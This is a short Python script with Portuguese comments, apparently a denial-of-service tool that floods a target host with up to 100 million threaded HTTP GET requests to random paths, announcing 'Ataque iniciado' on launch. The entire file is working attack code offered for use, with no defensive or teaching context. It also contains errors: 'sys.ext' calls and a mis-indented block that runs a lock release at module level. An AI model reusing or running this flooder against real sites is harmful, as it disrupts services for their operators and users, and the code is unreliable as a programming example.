import random
import socket
import string
import sys
import threading
import time

#inputs 
host = ""
ip = ""
porta = 0
requisições = 0

if len(sys.argv) == 2:
    porta = 80
    requisições = 100000000
elif len(sys.argv) == 3:
    porta = int(sys.argv[2])
    requisições = 100000000
elif len(sys.argv) == 4:
    porta = int(sys.argv[2])
    requisições = int(sys.argv[3])
else:
    print (f"ERRO\n Usage: {sys.argv[0]} < Hostname > < Porta > < Numero_de_ataques >")
    sys.ext(1)
    
#converter dominio para IP
try:
    host = str(sys.argv[1]).replace("https://", "").replace("http://", "").replace("www.", "")
    ip = socket.gethostbyname(host)
except socket.gaierror:
    print ("ERRO\n Verifique se colocou a URL correta")
    sys.ext(2)

#criar um compartilhamento de variaveis
thread_num = 0
thread_num_mutex = threading.Lock()

#print dos thread
def print_status():
    global thread_num
    thread_num_mutex.acquire(True)

    thread_num += 1
    #output

sys.stdout.write(f"\r {time.ctime().split( )[3]} [{str(thread_num)}] #-#-# Se segure #-#-#")
sys.stdout.flush()
thread_num_mutex.release()

#Gerando url path
def generate_url_path():
    msg = str(string.ascii_letters + string.digits + string.punctuation)
    data = "".join(random.sample(msg, 5))
    return data

#Realizar requisições
def attack():
    print_status()
    url_path = generate_url_path()

    #criando raw socket
    dos = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    try:
        dos.connect((ip, porta))
        byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
        dos.send(byt)
    except socket.error:
        print (f"\n [Sem conexão ]: {str(socket.error)}")
    finally:
        dos.shutdown(socket.SHUT_RDWR)
        dos.close()


print (f"[#] Ataque iniciado {host} ({ip} ) || Porta: {str(porta)} || #Requisições: {str(requisições)}")

#spaw thread por requisições feitas
all_threads = []
for i in range(requisições):
    t1 = threading.Thread(target=attack)
    t1.start()
    all_threads.append(t1)

    time.sleep(0.01)

for current_thread in all_threads:
    current_thread.join()

    print("Todas as threads concluíram.")
